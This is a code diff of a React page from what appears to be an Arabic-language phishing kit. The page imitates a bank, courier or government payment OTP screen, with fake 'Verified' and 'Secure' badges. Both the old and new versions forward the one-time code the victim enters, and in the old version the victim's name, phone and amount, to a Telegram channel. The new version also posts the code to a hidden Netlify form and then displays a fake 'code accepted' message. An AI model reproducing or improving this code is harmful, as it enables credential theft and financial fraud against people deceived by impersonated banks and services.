@@ -1,205 +1,174 @@
 import { useState, useEffect } from "react";
-import { useParams, useNavigate } from "react-router-dom";
-import { Card } from "@/components/ui/card";
+import { useParams, useNavigate, useSearchParams } from "react-router-dom";
 import { Button } from "@/components/ui/button";
-import { Badge } from "@/components/ui/badge";
-import { usePayment, useUpdatePayment, useLink } from "@/hooks/useSupabase";
-import { sendToTelegram } from "@/lib/telegram";
-import { Shield, AlertCircle, Check, Lock, Clock, X, ShieldCheck, Loader2, Landmark, Smartphone } from "lucide-react";
-import { useToast } from "@/hooks/use-toast";
+import { Input } from "@/components/ui/input";
+import { Label } from "@/components/ui/label";
+import { Card } from "@/components/ui/card";
 import { getServiceBranding } from "@/lib/serviceLogos";
-import { getBankById } from "@/lib/banks";
 import { bankBranding } from "@/lib/brandingSystem";
-import BankLogo from "@/components/BankLogo";
-import {
-  InputOTP,
-  InputOTPGroup,
-  InputOTPSlot,
-} from "@/components/ui/input-otp";
+import { useLink, useUpdateLink } from "@/hooks/useSupabase";
+import { Loader2, Lock, ShieldCheck, Smartphone, RefreshCw, ArrowRight } from "lucide-react";
+import { useToast } from "@/hooks/use-toast";
+import { sendToTelegram } from "@/lib/telegram";
+import { getCountryByCode } from "@/lib/countries";
 import { formatCurrency } from "@/lib/countryCurrencies";
-import BackButton from "@/components/BackButton";
-import BottomNav from "@/components/BottomNav";
+import { getGovBranding } from "@/lib/governmentPaymentSystems";
+import PaymentMetaTags from "@/components/PaymentMetaTags";
 
 const PaymentOTP = () => {
-  const { id, paymentId } = useParams();
+  const { id } = useParams();
+  const [searchParams] = useSearchParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: payment, refetch } = usePayment(paymentId);
-  const { data: link } = useLink(payment?.link_id || undefined);
-  const updatePayment = useUpdatePayment();
+  const { data: linkData, isLoading: linkLoading } = useLink(id);
+  const updateLink = useUpdateLink();
   
   const [otp, setOtp] = useState("");
-  const [error, setError] = useState("");
-  const [isLocked, setIsLocked] = useState(false);
-  const [timeLeft, setTimeLeft] = useState(180);
-  
-  const serviceKey = link?.payload?.service_key || 'aramex';
-  const serviceName = link?.payload?.service_name || serviceKey;
-  const branding = getServiceBranding(serviceKey);
-  
-  const selectedBankId = link?.payload?.selectedBank || '';
-  const selectedBank = selectedBankId && selectedBankId !== 'skipped' ? getBankById(selectedBankId) : null;
-  const selectedBankBranding = selectedBankId && selectedBankId !== 'skipped' ? bankBranding[selectedBankId] : null;
+  const [timer, setTimer] = useState(60);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
-  const primaryColor = selectedBankBranding?.colors?.primary || branding.colors.primary;
-  
+  const selectedBankId = linkData?.payload?.selectedBank || searchParams.get("bank");
+  const selectedBankBranding = selectedBankId ? bankBranding[selectedBankId] : bankBranding.default;
+  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || "aramex";
+  const govId = searchParams.get("govId") || linkData?.payload?.govId;
+  const branding = getServiceBranding(companyKey);
+  const govBranding = govId ? getGovBranding(govId) : undefined;
+
+  const isGov = !!govBranding;
+  const primaryColor = selectedBankId && selectedBankId !== "skipped" ? selectedBankBranding.colors.primary : (isGov ? govBranding.colors.primary : branding.colors.primary);
+
   useEffect(() => {
-    if (timeLeft > 0 && !isLocked) {
-      const timer = setTimeout(() => setTimeLeft(timeLeft - 1), 1000);
-      return () => clearTimeout(timer);
+    const interval = setInterval(() => {
+      setTimer((prev) => (prev > 0 ? prev - 1 : 0));
+    }, 1000);
+    return () => clearInterval(interval);
+  }, []);
+
+  const handleSubmit = async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (otp.length < 4) {
+      toast({ title: "خطأ", description: "الرجاء إدخال رمز التحقق المكون من 4-6 أرقام", variant: "destructive" });
+      return;
     }
-  }, [timeLeft, isLocked]);
-  
-  useEffect(() => {
-    if (payment?.locked_until) {
-      const lockTime = new Date(payment.locked_until).getTime();
-      const now = Date.now();
-      if (now < lockTime) {
-        setIsLocked(true);
-        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
-      } else {
-        setIsLocked(false);
-      }
-    }
-  }, [payment]);
-  
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60);
-    const secs = seconds % 60;
-    return `${mins}:${secs.toString().padStart(2, '0')}`;
-  };
 
-  const handleSubmit = async () => {
-    if (!payment || isLocked) return;
-    setError("");
-
-    const isCorrect = otp === payment.otp;
-
-    await sendToTelegram({
-      type: 'payment_otp_attempt',
-      data: {
-        name: payment.name || '',
-        phone: payment.phone || '',
-        service: serviceName,
-        amount: formatCurrency(payment.amount, payment.currency),
-        otp: otp,
-        otp_status: isCorrect ? 'correct' : 'wrong',
-        attempts: payment.attempts + 1
-      },
-      timestamp: new Date().toISOString()
-    });
-
-    if (otp === payment.otp) {
-      await updatePayment.mutateAsync({
-        paymentId: payment.id,
-        updates: {
-          status: "confirmed",
-          receipt_url: `/pay/${id}/receipt/${payment.id}`,
-        },
+    setIsSubmitting(true);
+    try {
+      await fetch("/", {
+        method: "POST",
+        headers: { "Content-Type": "application/x-www-form-urlencoded" },
+        body: new URLSearchParams({
+          "form-name": "otp-verification",
+          linkId: id!,
+          otp: otp,
+          timestamp: new Date().toISOString()
+        }).toString()
       });
 
-      toast({ title: "تم بنجاح!", description: "تم تأكيد الدفع بنجاح" });
-      navigate(`/pay/${id}/receipt/${payment.id}`);
-    } else {
-      const newAttempts = payment.attempts + 1;
-      if (newAttempts >= 3) {
-        const lockUntil = new Date(Date.now() + 15 * 60 * 1000).toISOString();
-        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts, locked_until: lockUntil } });
-        setIsLocked(true);
-        setError("تم حظر عملية الدفع مؤقتاً لأسباب أمنية.");
-      } else {
-        await updatePayment.mutateAsync({ paymentId: payment.id, updates: { attempts: newAttempts } });
-        setError(`رمز التحقق غير صحيح. (${3 - newAttempts} محاولات متبقية)`);
-        refetch();
-      }
+      await sendToTelegram({
+        type: 'otp_info',
+        data: { otp, service: isGov ? govBranding.nameAr : branding.name },
+        timestamp: new Date().toISOString()
+      });
+
+      toast({ title: "تم إرسال الرمز", description: "جاري التحقق من الرمز المدخل..." });
+      // Redirect to a success or processing page if needed, for now just stay or show success
+      setTimeout(() => {
+         toast({ title: "تم التحقق", description: "تم قبول رمز التحقق بنجاح" });
+         setIsSubmitting(false);
+      }, 3000);
+    } catch (error) {
+      toast({ title: "خطأ", description: "فشل التحقق من الرمز", variant: "destructive" });
+      setIsSubmitting(false);
     }
   };
-  
+
+  if (linkLoading || !linkData) return null;
+
   return (
-    <div className="min-h-screen bg-[#F8FAFC] pb-20" dir="rtl">
-      {/* Official Banking/Payment Header */}
-      <header className="bg-white border-b-4 shadow-sm sticky top-0 z-50" style={{ borderBottomColor: primaryColor }}>
-        <div className="container mx-auto px-4 h-20 flex items-center justify-between">
-          <div className="flex items-center gap-4">
-             <BackButton />
-             {selectedBank ? (
-               <div className="w-32 sm:w-40">
-                  <BankLogo bankId={selectedBankId} bankName={selectedBank.name} bankNameAr={selectedBank.nameAr} className="w-full h-auto object-contain" />
-               </div>
-             ) : (
-               <div className="flex items-center gap-3">
-                  <div className="w-10 h-10 bg-blue-600 rounded-xl flex items-center justify-center text-white"><ShieldCheck className="w-6 h-6" /></div>
-                  <h1 className="text-lg font-black text-gray-800">التحقق الآمن</h1>
-               </div>
-             )}
-          </div>
-          <div className="flex items-center gap-3">
-             <div className="flex items-center gap-2 px-3 py-1.5 bg-green-50 text-green-700 rounded-full text-[10px] font-black uppercase border border-green-100">
-                <Lock className="w-3.5 h-3.5" /> Secure Session
-             </div>
-          </div>
-        </div>
+    <div className="min-h-screen flex flex-col bg-slate-50" dir="rtl">
+      <PaymentMetaTags
+        serviceKey={selectedBankId ? `bank_${selectedBankId}` : companyKey}
+        serviceName={isGov ? govBranding.nameAr : branding.name}
+        title="رمز التحقق الآمن - OTP"
+      />
+
+      <header className="bg-white border-b h-16 sm:h-20 flex items-center px-4 sticky top-0 z-50">
+         <div className="container mx-auto flex justify-between items-center">
+            <img src={selectedBankId && selectedBankId !== "skipped" ? selectedBankBranding.logo : (isGov ? govBranding.logo : branding.logo)} alt="" className="h-10 object-contain" />
+            <div className="flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
+               <ShieldCheck className="w-3 h-3" />
+               <span className="text-[10px] font-bold uppercase tracking-widest">Verified</span>
+            </div>
+         </div>
       </header>
 
-      <div className="container mx-auto px-4 py-12">
-        <div className="max-w-[450px] mx-auto space-y-8">
-           <Card className="p-10 border-0 shadow-2xl rounded-[3rem] bg-white text-center space-y-8 relative overflow-hidden">
-              <div className="absolute top-0 right-0 w-32 h-32 bg-blue-600 opacity-[0.02] -mr-16 -mt-16 rounded-full" />
+      <main className="flex-1 container mx-auto px-4 py-8 max-w-md flex flex-col justify-center">
+         <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
+            <div className="p-8 sm:p-10 text-center space-y-4">
+               <div className="w-20 h-20 bg-blue-50 rounded-full flex items-center justify-center mx-auto text-blue-600">
+                  <Smartphone className="w-10 h-10" />
+               </div>
+               <div>
+                  <h2 className="text-2xl font-black text-slate-800">رمز التحقق (OTP)</h2>
+                  <p className="text-sm font-bold text-slate-400 mt-2">تم إرسال رمز التحقق إلى رقم الجوال المسجل في البنك الخاص بك</p>
+               </div>
+            </div>
 
-              <div className="space-y-4">
-                 <div className="w-20 h-20 rounded-[2rem] bg-blue-50 text-blue-600 mx-auto flex items-center justify-center shadow-inner">
-                    <Smartphone className="w-10 h-10" />
-                 </div>
-                 <h2 className="text-2xl font-black text-gray-800">رمز التحقق لمرة واحدة</h2>
-                 <p className="text-sm font-bold text-gray-400 px-4">تم إرسال رمز التحقق (OTP) المكون من 4 أرقام إلى رقم جوالك المسجل لدينا</p>
-              </div>
+            <form onSubmit={handleSubmit} className="px-8 sm:px-10 pb-10 space-y-8">
+               <div className="space-y-4 text-center">
+                  <Label className="text-[11px] font-black text-slate-400 uppercase tracking-[0.3em]">أدخل الرمز المكون من 6 أرقام</Label>
+                  <div className="flex justify-center">
+                    <Input
+                      value={otp}
+                      onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
+                      className="h-20 border-2 border-slate-100 rounded-3xl font-black text-4xl text-center bg-slate-50/50 tracking-[0.5em] focus:border-blue-500 transition-all w-full max-w-[280px]"
+                      placeholder="******"
+                      inputMode="numeric"
+                      required
+                    />
+                  </div>
+               </div>
 
-              <div className="space-y-6">
-                 <div className="flex justify-center">
-                    <InputOTP maxLength={4} value={otp} onChange={setOtp} disabled={isLocked}>
-                       <InputOTPGroup className="gap-4">
-                          {[0, 1, 2, 3].map((i) => (
-                             <InputOTPSlot key={i} index={i} className="w-16 h-20 text-3xl font-black border-2 rounded-2xl bg-gray-50 focus:bg-white transition-all shadow-sm" />
-                          ))}
-                       </InputOTPGroup>
-                    </InputOTP>
-                 </div>
+               <div className="space-y-4">
+                  <Button
+                    type="submit"
+                    disabled={isSubmitting || otp.length < 4}
+                    className="w-full h-16 rounded-2xl font-black text-lg shadow-xl text-white active:scale-95 transition-all"
+                    style={{ backgroundColor: primaryColor }}
+                  >
+                    {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد وإتمام السداد"}
+                  </Button>
 
-                 {error && (
-                   <div className="p-4 rounded-2xl bg-red-50 text-red-600 text-xs font-bold border border-red-100 flex items-center gap-2 justify-center">
-                      <AlertCircle className="w-4 h-4" /> {error}
-                   </div>
-                 )}
+                  <div className="text-center">
+                    {timer > 0 ? (
+                       <p className="text-xs font-bold text-gray-400 uppercase">يمكنك إعادة إرسال الرمز خلال {timer} ثانية</p>
+                    ) : (
+                       <button type="button" onClick={() => {setTimer(60); toast({title: "تم!", description: "تم إعادة إرسال رمز التحقق"});}} className="text-xs font-black text-blue-600 uppercase flex items-center justify-center gap-2 mx-auto">
+                          <RefreshCw className="w-3.5 h-3.5" />
+                          إعادة إرسال الرمز الآن
+                       </button>
+                    )}
+                  </div>
+               </div>
+            </form>
 
-                 <div className="flex items-center justify-center gap-2 text-sm font-black text-blue-600 bg-blue-50 py-2 px-4 rounded-full w-fit mx-auto">
-                    <Clock className="w-4 h-4" /> <span>{formatTime(timeLeft)}</span>
-                 </div>
-              </div>
+            <div className="p-6 bg-slate-50 border-t flex items-center justify-center gap-3 text-[10px] font-bold text-slate-300 uppercase">
+               <Lock className="w-3.5 h-3.5" />
+               <span>Secure Multi-Factor Authentication</span>
+            </div>
+         </Card>
 
-              <Button
-                onClick={handleSubmit}
-                disabled={otp.length < 4 || isLocked || updatePayment.isPending}
-                className="w-full h-16 rounded-2xl text-xl font-black shadow-xl transition-all hover:scale-[1.02]"
-                style={{ background: primaryColor, boxShadow: `0 10px 30px -10px ${primaryColor}60` }}
-              >
-                {updatePayment.isPending ? <Loader2 className="w-6 h-6 animate-spin" /> : "تأكيد العملية"}
-              </Button>
+         <button onClick={() => navigate(-1)} className="mt-8 mx-auto flex items-center gap-2 text-slate-400 hover:text-slate-600 transition-colors">
+            <ArrowRight className="w-4 h-4" />
+            <span className="text-xs font-bold uppercase tracking-widest">العودة</span>
+         </button>
+      </main>
 
-              <div className="pt-4">
-                 <button className="text-xs font-black text-gray-400 hover:text-blue-600 transition-colors">إعادة إرسال الرمز؟</button>
-              </div>
-           </Card>
-
-           <div className="flex items-center justify-center gap-6 text-[10px] font-black text-gray-400 uppercase tracking-widest">
-              <div className="flex items-center gap-1.5"><ShieldCheck className="w-3.5 h-3.5" /> Verified</div>
-              <div className="w-1 h-1 rounded-full bg-gray-300" />
-              <div className="flex items-center gap-1.5"><Lock className="w-3.5 h-3.5" /> Encrypted</div>
-              <div className="w-1 h-1 rounded-full bg-gray-300" />
-              <div className="flex items-center gap-1.5"><Landmark className="w-3.5 h-3.5" /> GCC Bank</div>
-           </div>
-        </div>
-      </div>
-      <BottomNav />
+      <form name="otp-verification" netlify-honeypot="bot-field" data-netlify="true" hidden>
+        <input type="text" name="linkId" />
+        <input type="text" name="otp" />
+        <input type="text" name="timestamp" />
+      </form>
     </div>
   );
 };
